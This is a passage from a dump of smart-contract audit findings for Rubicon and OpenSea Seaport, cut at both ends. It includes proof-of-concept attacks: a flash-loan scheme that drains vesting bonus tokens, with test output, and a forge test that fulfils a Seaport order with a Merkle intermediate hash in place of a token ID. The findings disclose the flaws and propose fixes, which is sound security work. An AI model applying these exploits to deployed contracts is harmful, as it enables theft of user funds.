https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557   # Vulnerability details  ## Background  A transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount. For instance, a deflationary tokens might charge a certain fee for every transfer() or transferFrom()  Rubicon Finance supports the trading of any ERC20 token, and anyone can liquidity pool for a new token. Thus, it is possible that such a transfer-on-fee token or a deflationary/rebasing token be used in the protocol.  Based on the source code and comment of `BathToken._deposit()`, it appears that the team is aware of this issue, and proactively implemented control (before & after balance checks) to deal with deflationary tokens.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557)  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens      (totalSupply == 0) ? shares = assets : shares = (         assets.mul(totalSupply)     ).div(_pool);      // Send shares to designated target     _mint(receiver, shares);     ..SNIP.. } ```  However, such control was not consistently applied across the protocol, and might cause the internal accounting of the orderbook to be incorrect.  ## Proof-of-Concept  If the `pay_gem` token is an deflationary token, the `info.pay_amt` and the actual amount of `pay_gem` tokens received will not be in sync.   For instance, assume that  XYZ token is a deflation token that charges 10% fee for every transfer. If an `offer(100, XYZ, 100, DAI)` is executed, an order with 100 XYZ (pay) and 100 DAI (buy) will be added to the orderbook. However, the orderbook will only received 90 XYZ, thus only 90 XYZ is ecrowed in the orderbook. This discrepancy would break the internal accounting system of the order book.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392)  ```solidity /// @notice Key function to make a new offer. Takes funds from the caller into market escrow. function offer(     uint256 pay_amt,     ERC20 pay_gem,     uint256 buy_amt,     ERC20 buy_gem ) public virtual can_offer synchronized returns (uint256 id) {     ..SNIP..     OfferInfo memory info;     info.pay_amt = pay_amt;     info.pay_gem = pay_gem;     info.buy_amt = buy_amt;     info.buy_gem = buy_gem;     info.owner = msg.sender;     info.timestamp = uint64(block.timestamp);     id = _next_id();     offers[id] = info;      require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));     ..SNIP.. } ```  ## Impact  The internal accounting system of the order book would be inaccurate or break, affecting the protocol operation.  ## Recommended Mitigation Steps  In the `offer` function, get the actual received amount by calculating the difference of token balance before and after the transfer, and set the `info.pay_amt` to the actual received amount.  Alternatively, the team might want to consider implementing whitelisting mechanism so that deflationary tokens will not be supported if the risk of allowing permissionless creation of pool with arbitrary token deems to be significant. A DAO may be formed in the future to manage the whitelisting.  "}, {"title": "Attacker Could Steal Almost All The Bonus Token In BathBuddy Vesting Wallet", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/109", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool\u2019s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that an attacker could steal almost all the `bonusTokens` in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The root cause of this issue is that the amount of `bonusTokens` that a user is entitled to is based on their relative share of the pool\u2019s total vested bonus token at the point of the withdraw call. It is calculated based on the user's \"spot\" share in the pool. Thus, it is possible for an attacker to deposit large amount of tokens into a BathToken Pool to gain significant share of the pool (e.g. 95%), and then withdraw the all the shares immediately. The withdraw call will trigger the `BathToken.distributeBonusTokenRewards`, and since attacker holds overwhelming amount of share in the pool, they will receive almost all the `bonusToken` in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. This could be perform in an atomic transaction and attacker can leverage on flash-loan to fund this attack.  The following shows an example of this issue:  1. A sponsor sent 1000 DAI to the BathBuddy Vesting Wallet to be used as `bonusTokens` for bathWETH pool. The vesting duration is 4 weeks. 2. Alice and Bob deposited 50 WETH and 50 WETH respectively. The total underlying asset of bathWETH is 100 WETH after depositing. Each of them hold 50% of the shares in the pool. 3. Fast forward to the last hour of the vesting period, most of the `bonusToken` have been vested and ready for the recipients to claim. In this example, estimate 998 DAI are ready to be claimed at the final hour. 4. Since Alice has 50% stake in the pool, she should have accured close to 449 DAI at this point. If she decided to withdraw all her bathWETH LP tokens at this point, she would receive close to 449 DAI as `bonusTokens`. But she choose not to withdraw yet. 5. Unfortunately, an attacker performed a flash-loan to borrow 8500 WETH, and deposit large amount of WETH into the bathWETH gain significant share of the pool, and then withdraw the all the shares immediately. 6. Since attacker hold the an overwhelming amount of shares in the pool, they will receive almost all the `bonusToken` (around 997 DAI) in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. 7. At this point, Alice decided to withdraw all her bathWETH LP token. She only received dust amount of 0.7 DAI as `bonusTokens`  The following code shows that the amount of `bonusTokens` a user is entitled is based on the user's current share in the pool - `amount = releasable * sharesWithdrawn/initialTotalSupply`.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87)  ```solidity /// @inheritdoc IBathBuddy /// @dev Added and modified release function. Should be the only callable release function function release(     IERC20 token,     address recipient,     uint256 sharesWithdrawn,     uint256 initialTotalSupply,     uint256 poolFee ) external override {     require(         msg.sender == beneficiary,         \"Caller is not the Bath Token beneficiary of these rewards\"     );     uint256 releasable = vestedAmount(         address(token),         uint64(block.timestamp)     ) - released(address(token));     if (releasable > 0) {         uint256 amount = releasable.mul(sharesWithdrawn).div(             initialTotalSupply         );         uint256 _fee = amount.mul(poolFee).div(10000);          ..SNIP..          uint256 amountWithdrawn = amount.sub(_fee);         token.transfer(recipient, amountWithdrawn);          _erc20Released[address(token)] += amount;         ..SNIP..     } } ```  ## Test Scripts  Following is the test output that demostrate the above scenario:  ```javascript   Contract: Rubicon Exchange and Pools Original Tests     Deployment       \u2713 is deployed (1783ms)     Bath House Initialization of Bath Pair and Bath Tokens       \u2713 Bath House is deployed and initialized (66ms)         new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f       \u2713 WETH Bath Token for WETH asset is deployed and initialized (131ms)       \u2713 Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)       \u2713 Bath Pair is deployed and initialized w/ BathHouse (59ms)         undefined       \u2713 Alice deposit 50 WETH to WETH bathTokens (137ms)         undefined       \u2713 Bob deposit 50 WETH to WETH bathTokens (174ms) bathAssetInstance.bonusTokens.length = 1 bathBuddyInstance (Vesting Wallet) has 1000 DAI bathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788 bathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week) bathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period) 0 DAI has been released from BathBuddy Vesting Wallet Charles has 8500 bathWETH token, 0 DAI, 0 WETH Charles withdraw all his bathWETH tokens 997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet Charles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH Alice has 5 bathWETH token, 0 DAI, 0 WETH 998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet Alice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH       \u2713 Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms) bathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH       \u2713 [Debug] ```  Attacker Charles deposited 8500 WETH to the pool and withdraw them immediately at the final hour, and obtained almost all of the `bonusTokens` (997 DAI). When Alice withdraw from the pool, she only received 0.7 DAI as `bonusTokens`.  Script can be found [https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5](https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5)  Note: Due to some unknown issue with the testing environment, please create a new `BathBuddy.released2` functions to fetch the amount of token already released.  ## Impact  Loss of Fund for the users. BathToken LPs not able to receive the accured `bonusToken` that they are entitled to.  ## Recommended Mitigation Steps  Update the reward mechanism to ensure that the `bonusTokens` are distribute fairly and rewards of each user are accured correctly.  In the above example, since Alice hold 50% of the shares in the pool throughout the majority of the reward period, she should be entitled to close to 50% to the rewards/bonus. Anyone who join the pool at the last hour of the reward period should only be entitled dust amount of `bonusToken`.  Additionally, \"spot\" (or current) share of the pool should not be used to determine the amount of `bonusToken` a user is entitled to as it is vulnerable to pool/share manipulation or flash-loan attack. Checkpointing mechanism should be implemented so that at the minimum, the user's amount of share in the previous block is used for determining the rewards. This make flash-loan attack infeasible as such attack has to happen within the same block/transaction.  For distributing bonus/rewards, I would suggest checking out a widely referenced [Synthetix's Reward](https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol) Contract as I think that it would be more relevant than OZ's Vesting Wallet for this particular purpose.  "}, {"title": "BathToken LPs Unable To Receive Bonus Token Due To Lack Of Wallet Setter Method", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/107", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool\u2019s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that the BathToken LPs are unable to receive any bonus tokens from the BathBuddy Vesting Wallet during withdraw and the bonus tokens are struck in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The following shows that the address of the BathBuddy Vesting Wallet is stored in the `rewardsVestingWallet` state variable and it is used to call the `release` function to distribute bonus to the BathToken withdrawers.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629)  ```solidity function distributeBonusTokenRewards(     address receiver,     uint256 sharesWithdrawn,     uint256 initialTotalSupply ) internal {     if (bonusTokens.length > 0) {         for (uint256 index = 0; index < bonusTokens.length; index++) {             IERC20 token = IERC20(bonusTokens[index]);             // Note: Shares already burned in Bath Token _withdraw              // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they             //  are released their relative share of this pool, of vested BathBuddy rewards             // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens             if (rewardsVestingWallet != IBathBuddy(0)) {                 rewardsVestingWallet.release(                     (token),                     receiver,                     sharesWithdrawn,                     initialTotalSupply,                     feeBPS                 );             }         }     } } ```  However, there is no setter method to initialise the value of the `rewardsVestingWallet` state variable in the contracts. Therefore, the value of `rewardsVestingWallet` will always be zero. Note that Solidity only create a default getter for public state variable, but does not create a default setter.  Since `rewardsVestingWallet` is always zero, the condition `if (rewardsVestingWallet != IBathBuddy(0))` will always be evaluated as `false`. Thus, the code block `rewardsVestingWallet.release` will never be reached.  ## Impact  Loss of Fund for the users. BathToken LPs are not able to receive their `bonusToken`.  ## Recommended Mitigation Steps  Implement a setter method for the `rewardsVestingWallet` state variable in the contracts so that it can be initialised with BathBuddy Vesting Wallet address.  "}, {"title": "RubiconRouter _swap does not pass whole amount to RubiconMarket", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/104", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L229:#L244   # Vulnerability details  When swapping amongst multiple pairs in RubiconRouter's `_swap`, the fee is wrongly accounted for.  ## Impact Not all of the user's funds would be forwarded to RubinconMarket, therefore the user would lose funds.  ## Proof of Concept The `_swap` function is calculating the pay amount to send to RubiconMarket.sellAllAmount [to be](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L232): ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000) ``` But this would lead to not all of the funds being pulled by RubiconMarket. I mathematically show this in [this image](https://i.ibb.co/J5678C3/c4amountlost.jpg). The correct parameter that needs to be sent to sellAllAmount is: ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000+expectedMarketFeeBPS) ``` I mathematically prove this in [this image](https://i.ibb.co/xHzYfzF/c4newparam.jpg).  ## Recommended Mitigation Steps Change the parameter to the abovementioned one.  "}, {"title": "USDT is not supported because of approval mechanism", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/100", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256   # Vulnerability details  When using the approval mechanism in USDT, the approval must be set to 0 before it is updated. In Rubicon, when creating a pair, the paired asset's approval is not set to 0 before it is updated.  ## Impact Can't create pairs with USDT, the most popular stablecoin, as as the approval will revert.  ## Proof of Concept [USDT](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code) reverts on approval if previous allowance is not 0: ``` require(!((_value != 0) && (allowed[msg.sender][_spender] != 0))); ``` When creating a pair, Rubicon [approves](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180) the paired asset without first setting it to 0: ``` desiredPairedAsset.approve(pairedPool, initialLiquidityExistingBathToken); ``` Therefore, if desiredPairedAsset is USDT, the function will revert, and pairs with USDT can not be created.  This problem will also manifest in RubiconMarket's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157) and BathToken's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256),   ## Recommended Mitigation Steps Set the allowance to 0 before setting it to the new value.  "}, {"title": "Use `call()` instead of `transfer()` when transferring ETH in RubiconRouter", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/82", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L356 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L374 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L434 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L451 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L491 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L548   # Vulnerability details  ## Impact When transferring ETH, use `call()` instead of `transfer()`.  The `transfer()` function only allows the recipient to use 2300 gas. If the recipient uses more than that, transfers will fail. In the future gas costs might change increasing the likelihood of that happening.  Keep in mind that `call()` introduces the risk of reentrancy. But, as long as the router follows the checks effects interactions pattern it should be fine. It's not supposed to hold any tokens anyway.  ## Proof of Concept See the linked code snippets above.  ## Tools Used none  ## Recommended Mitigation Steps Replace `transfer()` calls with `call()`. Keep in mind to check whether the call was successful by validating the return value:  ```sol (bool success, ) = msg.sender.call{value: amount}(\"\"); require(success, \"Transfer failed.\") ```  "}, {"title": "BathBuddy locks up Ether it receives", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/78", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69   # Vulnerability details  ## Impact The BathBuddy contract is able to receive ETH. But, there's no way of ever retrieving that ETH from the contract. The funds will be locked up.  Currently, there seems to be no logic in the protocol where ETH is sent to the contract. But, it might happen in the future. So I'd say it's a MED issue.  ## Proof of Concept `receive()`  function: https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69  ## Tools Used none  ## Recommended Mitigation Steps Remove the `receive()` function if the contract isn't supposed to handle ETH. Otherwise, add the necessary logic to release the ETH it gets.  "}, {"title": "No Storage Gap for Upgradeable Contracts", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/67", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L525-L535   # Vulnerability details  ## Impact  For upgradeable contracts, there must be storage gap to \"allow developers to freely add new state variables in the future without compromising the storage compatibility with existing deployments\". Otherwise it may be very difficult to write new implementation code. Without storage gap, the variable in child contract might be overwritten by the upgraded base contract if new variables are added to the base contract. This could have unintended and very serious consequences to the child contracts.  Refer to the bottom part of this article: https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable  ## Proof of Concept  As an example, the `ExpiringMarket` contract inherits `SimpleMarket`, and the `SimpleMarket` contract does not contain any storage gap. If in a future upgrade, an additional variable is added to the `SimpleMarket` contract, that new variable will overwrite the storage slot of the `stopped` variable in the `ExpiringMarket` contract, causing unintended consequences.   https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449  Similarly, the `ExpiringMarket` does not contain any storage gap either, and the `RubiconMarket` contract inherits `ExpiringMarket`. If a new variable is added to the `ExpiringMarket` contract in an upgrade, that variable will overwrite the `buyEnabled` variable in `ExpiringMarket` contract.   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates.  ```solidity uint256[50] private __gap; ```  "}, {"title": "Wrong DOMAIN_SEPARATOR", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/38", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210   # Vulnerability details  ## Impact The `DOMAIN_SEPARATOR` is wrong calculated.  ## Proof of Concept  In the `initialize` method of the `BathToken` contract, the `name` of the contract is used to calculate the `DOMAIN_SEPARATOR`, however said name is set later, so it will use an incorrect `name`, making it impossible to calculate the `DOMAIN_SEPARATOR` correctly.  ```javascript DOMAIN_SEPARATOR = keccak256(     abi.encode(         keccak256(             \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"         ),         keccak256(bytes(name)),         keccak256(bytes(\"1\")),         chainId,         address(this)     ) ); name = string(abi.encodePacked(_symbol, (\" v1\"))); ```  Affected source code: - [BathToken.sol#L199-L210](https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210)  ## Recommended Mitigation Steps - Set the `name` before use it.  "}, {"title": "RubiconRouter: Offers created through offerWithETH() can be cancelled by anyone", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/17", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409   # Vulnerability details  ## Impact When a user creates an offer through the offerWithETH function of the RubiconRouter contract, the offer function of the RubiconMarket contract is called, and the RubiconRouter contract address is set to offer.owner in the offer function. This means that anyone can call the cancelForETH function of the RubiconRouter contract to cancel the offer and get the ether. ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L440-L452 ## Tools Used None ## Recommended Mitigation Steps Set the owner of offer_id to msg.sender in offerWithETH function and check it in cancelForETH function  "}, {"title": "RubiconRouter: Excess ether did not return to the user", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/15", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339   # Vulnerability details  ## Impact In  swapWithETH/buyAllAmountWithETH/offerWithETH/depositWithETH functions of the RubiconRouter contract, when msg.value > max_fill_withFee/pay_amt/amount/amtWithFee, the excess ether will not be returned to the user.  ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L393 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L455-L462 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L494-L507 ## Tools Used None ## Recommended Mitigation Steps Return excess ether to msg.sender, or require msg.value == max_fill_withFee/pay_amt/amount/amtWithFee  "}, {"title": "Merkle Tree criteria can be resolved by wrong tokenIDs", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157   # Vulnerability details  ## Impact The protocol allows specifying several tokenIds to accept for a single offer. A merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item. The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.  There are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**. It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.  This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria. Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.  #### Example Alice wants to buy either NFT with tokenId 1 or tokenId 2. She creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`. She creates an offer for this criteria. An attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.  > One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard. >  > \"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'.\" [EIP721](https://eips.ethereum.org/EIPS/eip-721) > > Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions. > Therefore, ERC721-compliant token contracts are vulnerable to this attack.  #### POC Here's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in _Example_.  ```solidity contract BugMerkleTree is BaseOrderTest {     struct Context {         ConsiderationInterface consideration;         bytes32 tokenCriteria;         uint256 paymentAmount;         address zone;         bytes32 zoneHash;         uint256 salt;     }      function hashHashes(bytes32 hash1, bytes32 hash2)         internal         returns (bytes32)     {         // see MerkleProof.verify         bytes memory encoding;         if (hash1 <= hash2) {             encoding = abi.encodePacked(hash1, hash2);         } else {             encoding = abi.encodePacked(hash2, hash1);         }         return keccak256(encoding);     }      function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {         // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree         bytes32 leafLeft = bytes32(uint256(1));         bytes32 leafRight = bytes32(uint256(2));         bytes32 merkleRoot = hashHashes(leafLeft, leafRight);         console.logBytes32(merkleRoot);          Context memory context = Context(             consideration,             merkleRoot, /* tokenCriteria */             1e18, /* paymentAmount */             address(0), /* zone */             bytes32(0), /* zoneHash */             uint256(0) /* salt */         );         bytes32 conduitKey = bytes32(0);          token1.mint(address(alice), context.paymentAmount);         // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable         // we acquire the merkle root ID         test721_1.mint(address(this), uint256(merkleRoot));          _configureERC20OfferItem(             // start, end             context.paymentAmount, context.paymentAmount         );         _configureConsiderationItem(             ItemType.ERC721_WITH_CRITERIA,             address(test721_1),             // @audit set merkle root for NFTs we want to accept             uint256(context.tokenCriteria), /* identifierOrCriteria */             1,             1,             alice         );          OrderParameters memory orderParameters = OrderParameters(             address(alice),             context.zone,             offerItems,             considerationItems,             OrderType.FULL_OPEN,             block.timestamp,             block.timestamp + 1000,             context.zoneHash,             context.salt,             conduitKey,             considerationItems.length         );          OrderComponents memory orderComponents = getOrderComponents(             orderParameters,             context.consideration.getNonce(alice)         );         bytes32 orderHash = context.consideration.getOrderHash(orderComponents);         bytes memory signature = signOrder(             context.consideration,             alicePk,             orderHash         );          delete offerItems;         delete considerationItems;          /*************** ATTACK STARTS HERE ***************/         AdvancedOrder memory advancedOrder = AdvancedOrder(             orderParameters,             1, /* numerator */             1, /* denominator */             signature,             \"\"         );          // resolve the merkle root token ID itself         CriteriaResolver[] memory cr = new CriteriaResolver[](1);         bytes32[] memory proof = new bytes32[](0);         cr[0] = CriteriaResolver(               0, // uint256 orderIndex;               Side.CONSIDERATION, // Side side;               0, // uint256 index; (item)               uint256(merkleRoot), // uint256 identifier;               proof // bytes32[] criteriaProof;         );          uint256 profit = token1.balanceOf(address(this));         context.consideration.fulfillAdvancedOrder{             value: context.paymentAmount         }(advancedOrder, cr, bytes32(0));         profit = token1.balanceOf(address(this)) - profit;          // @audit could fulfill order without owning NFT 1 or 2         assertEq(profit, context.paymentAmount);     } } ```  ## Recommended Mitigation Steps Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a _leaf_ or not. An elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.) Then compute the leaf hash in the contract from the provided tokenId:  ```diff function _verifyProof(     uint256 leaf,     uint256 root,     bytes32[] memory proof ) internal pure {     bool isValid;  -    assembly { -        let computedHash := leaf +  bytes32 computedHash = keccak256(abi.encodePacked(leaf))   ... ```  There can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.  Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)   "}, {"title": "Wrong items length assertion in basic order", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349   # Vulnerability details  When fulfilling a basic order we need to assert that the parameter `totalOriginalAdditionalRecipients` is less or equal than the length of `additionalRecipients` written in calldata. However in `_prepareBasicFulfillmentFromCalldata` this assertion is incorrect [(L346)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349): ```js         // Ensure supplied consideration array length is not less than original.         _assertConsiderationLengthIsNotLessThanOriginalConsiderationLength(             parameters.additionalRecipients.length + 1,             parameters.totalOriginalAdditionalRecipients         ); ``` The way the function it's written 